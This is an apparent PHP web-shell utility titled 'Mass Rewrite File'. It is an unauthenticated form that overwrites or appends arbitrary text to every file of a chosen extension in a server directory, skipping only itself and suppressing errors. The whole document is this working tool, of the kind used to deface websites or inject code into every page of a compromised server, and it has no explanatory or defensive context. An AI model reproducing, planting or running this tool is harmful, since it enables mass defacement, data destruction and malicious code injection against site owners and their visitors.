<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css" integrity="sha384-Gn5384xqQ1aoWXA+058RXPxPg6fy4IWvTNh0E263XmFcJlSAwiGgFAW/dAiS6JXm" crossorigin="anonymous">
<script src="https://code.jquery.com/jquery-3.2.1.slim.min.js" integrity="sha384-KJ3o2DKtIkvYIK3UENzmM7KCkRr/rE9/Qpg6aAZGJwFDMVNA/GpGFF93hXpG5KkN" crossorigin="anonymous"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.12.9/umd/popper.min.js" integrity="sha384-ApNbgh9B+Y1QKtv3Rn7W3mgPxhU9K/ScQsAP7hUibX39j7fakFPskvXusvfa0b4Q" crossorigin="anonymous"></script>
<script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/js/bootstrap.min.js" integrity="sha384-JZR6Spejh4U02d8jOt6vLEHfe/JQGiRRSQQxSfFWpi1MquVdAyjUar5+76PVCmYl" crossorigin="anonymous"></script>
<title>Mass Rewrite File</title>
<style type="text/css">
	th {
		text-align:center;
	}
</style>
<br>
<div class="container" width="50%">
<table width="100%" align="center" class="table table-bordered">
	<thead class="thead-light">
		<tr>
			<th>MASS REWRITE FILE</th>
		</tr>
	</thead>
<form method="post">
	<tr>
		<td>
			<input class="form-control" type="text" name="dir" value="<?php print @getcwd() ?>">
		</td>
	</tr>
	<tr>
		<td>
			<select name="mode" class="form-control">
				<option>Rewrite</option>
				<option>Apender</option>
			</select>
		</td>
	</tr>
	<tr>
		<td>
			<input class="form-control" type="text" name="type" placeholder="type ext : html, php">
		</td>
	</tr>
	<tr>
		<td>
			<textarea style="height:350px;" class="form-control" name="text"></textarea>
		</td>
	</tr>
	<tr>
		<td>
			<input class="btn btn-primary" style="width:100%" type="submit" name="submit" value="MASS">
		</td>
	</tr>
</form>
<?php
if (isset($_POST['submit'])) {
	@masswrite($_POST['mode'], $_POST['dir'], $_POST['type'], $_POST['text']);
}
function masswrite($mode, $dir, $type, $text) {
	switch ($mode) {
		case 'Apender':
			$_mode = "a";
			break;
		
		case 'Rewrite':
			$_mode = "w";
			break;
	}
	if ($handle = @opendir($dir)) {
		while (($file = @readdir($handle)) !== false) {
			if ((@preg_match("/".$type."$"."/", $file, $matches) != 0) && (@preg_match("/".$file."$/", $_SERVER['PHP_SELF'], $matches) != 1)) {
				print("<tr><td>
					<div class='alert alert-success' role='alert'>
					<b>".$dir.DIRECTORY_SEPARATOR.$file."</b> Successfully !
					  <button type='button' class='close' data-dismiss='alert' aria-label='Close'>
					  <span aria-hidden='true'>&times;</span></button>
					</div></td></tr>");
				$fp = @fopen($dir.DIRECTORY_SEPARATOR.$file, $_mode);
				if ($fp) {
					@fwrite($fp, $text);
				} else {
					print("<tr><td>
						<div class='alert alert-danger' role='alert'>
						Error. Access Danied
						<div></td></tr>");
				}
			}
		}
	}
}
?>
</table>
